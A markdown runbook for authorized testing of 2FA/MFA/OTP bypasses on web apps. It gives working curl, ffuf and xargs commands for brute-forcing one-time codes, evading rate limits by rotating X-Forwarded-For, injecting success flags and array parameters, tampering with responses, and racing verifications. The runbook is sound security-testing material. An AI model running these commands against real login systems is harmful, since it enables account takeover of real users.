---
title: "2FA / MFA / OTP Bypass"
description: "Weak one-time codes, missing rate limits, response tampering, replay, race conditions, and OAuth or remember-me paths that skip the second factor."
phase: Web
order: 11
tags:
  - authentication
  - mfa
  - otp
  - account-takeover
tools:
  - curl
  - ffuf
  - burp suite
updated: 2026-10-01
---

A runbook for authorized MFA testing on **in-scope** targets. Goal: reach an authenticated session without a valid second factor, using accounts you own.

## 1. Capture the verification flow

Log in with your test account and save each step of the MFA flow from Burp.

```bash
# Login step sets a pre-auth cookie, then verification is a separate call
curl -s -c jar.txt -X POST https://target/login \
  -d "user=me@example.com&pass=...&session=abc" -o /dev/null
curl -s -b jar.txt -X POST https://target/verify \
  -d "code=000000&session=abc" -i
```

Note the code length (4 digits = 10k, 6 = 1M), the flow order, and whether success is decided client-side.

## 2. Measure rate limiting

Fire many wrong codes and watch for lockout, delay, or CAPTCHA.

```bash
seq -w 0 999 | ffuf -u https://target/verify -X POST \
  -d "code=FUZZ&session=abc" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "session=abc" -mc all -fs 0 -w - -t 20
```

Rotate `X-Forwarded-For`, tweak the parameter name case, and add extra params to slip past throttles.

## 3. Tamper with the response

The client often trusts a boolean or status code.

```bash
# Try success-flag injection and empty/omitted codes
curl -s -X POST https://target/verify -b "session=abc" -d "code=" -i
curl -s -X POST https://target/verify -b "session=abc" -d "code[]=&mfa=true" -i
curl -s -X POST https://target/verify -b "session=abc" -d "code=000000&success=true" -i
```

In Burp, rewrite `{"mfa":"false"}` to `true`, change `302 /dashboard` to `200`, or jump straight to a post-login URL.

## 4. Replay, reuse, and race

- Reuse one valid code across multiple sessions or after expiry.
- Race two identical verifications with the same code.
- Race login-plus-verify so one code yields two sessions.

```bash
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target/verify -b "session=abc" -d "code=123456"
```

Watch for double fulfillment or a code that never invalidates.

## 5. Backup codes and alternate paths

- Test whether backup codes are short, non-expiring, or rate-limit-free.
- Check if disabling MFA needs only the password, not a code.
- Review OAuth/SSO, "remember this device" cookies, and password reset.
- Look for endpoints like `/api/user/settings` that change MFA with no re-auth.

## 6. Prove impact

A valid bypass ends in an authenticated session or a reachable account action. Capture the full request sequence; never touch other users' accounts.

## Full pipeline

```bash
# 1. Capture a pre-auth session
curl -s -c jar.txt -X POST https://target/login \
  -d "user=me@example.com&pass=..." -o /dev/null

# 2. Measure rate limiting (expect lockout if implemented)
seq -w 0 999 | ffuf -u https://target/verify -X POST \
  -d "code=FUZZ&session=abc" -b "session=abc" \
  -mc all -fs 0 -w - -t 20

# 3. Empty / dropped / array code attempts
curl -s -X POST https://target/verify -b "session=abc" -d "code=" -i
curl -s -X POST https://target/verify -b "session=abc" -d "code[]=" -i

# 4. Race a known-good code
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target/verify -b "session=abc" -d "code=123456"
```

## Ethics & legality

- Only test accounts you own or are authorized to access; never target real users.
- Keep brute-force volume low and respect program rate limits.
- Document the request sequence and do not perform destructive account actions.
